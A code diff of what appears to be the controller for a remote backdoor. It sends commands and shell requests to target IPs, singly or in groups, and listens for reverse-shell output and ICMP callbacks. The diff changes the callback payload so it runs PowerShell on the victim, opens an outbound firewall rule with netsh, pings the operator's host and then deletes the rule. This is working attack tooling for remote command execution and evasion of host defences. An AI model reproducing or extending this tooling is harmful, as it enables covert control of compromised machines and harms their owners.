@@ -66,6 +66,7 @@ def listen(queue):
     while True:
         ans = conn.recv(1024 * 128).decode()
         sys.stdout.write(ans)
+
         if first:
             command = "\r"
             first = False
@@ -84,9 +85,9 @@ def listen(queue):
 
 
 def pingListen():
-    print(colored(f"[*] Waiting 10 seconds for callbacks.\n", "cyan"))
+    print(colored(f"[*] Waiting 15 seconds for callbacks.\n", "cyan"))
     pkts = scapy.sniff(
-        iface="utun3", filter="icmp", timeout=10
+        iface="utun3", filter="icmp", timeout=15
     ) 
     tCallbacks = []
 
@@ -102,7 +103,7 @@ def pingListen():
 
 def initPing(params):
     targetIP = params["LHOST"]
-    pingmode = "FC-CM-{}\00".format("ping " + targetIP + " -n 1")
+    pingmode = "FC-CM-{}\00".format("powershell -c netsh adv f a r dir=out protocol=icmpv4 action=allow name=\"y\"; ping " + targetIP + " -n 1; netsh adv f delete rule name=\"y\"")
     return pingmode
 
 
@@ -342,7 +343,7 @@ def ready(params):
                 if baseparams["MODE"] == "CMD" and verify(cmdparams):
                     plaintext = "FC-CM-{}\00".format(params["COMMAND"])
                     ip = cmdparams["RHOST"]
-                    print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "green"))
+                    print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "cyan"))
                     execute(plaintext, cmdparams)
                 elif baseparams["MODE"] == "SHELL" and verify(shellparams):
                     plaintext = "FC-SH-{}\00".format(params["LHOST"])
@@ -350,7 +351,7 @@ def ready(params):
                     queue = multiprocessing.Queue()
                     t = multiprocessing.Process(target=listen, args=(queue,))
                     t.start()
-                    print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "green"))
+                    print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "cyan"))
                     execute(plaintext, shellparams)
                     command = "\r"
                     try:
@@ -371,7 +372,7 @@ def ready(params):
                     for iplist in groupList:
                         for ip in iplist:
                             groupparams["RHOST"] = ip
-                            print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "green"))
+                            print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "cyan"))
                             t = multiprocessing.Process(target=execute, args=(plaintext,groupparams,))
                             t.start()
                     t.join()
@@ -417,7 +418,7 @@ def ready(params):
                 if op_1 in params.keys():
                     if op_1 == "RPORT" or op_1 == "LPORT":
                         op_2 = int(op_2)
-                    if op_1 == "COMMAND" or op_1 == "GROUP":
+                    elif op_1 == "GROUP":
                         op_2 = op_2.lower()
                     params[op_1] = op_2
                     print_options(params)
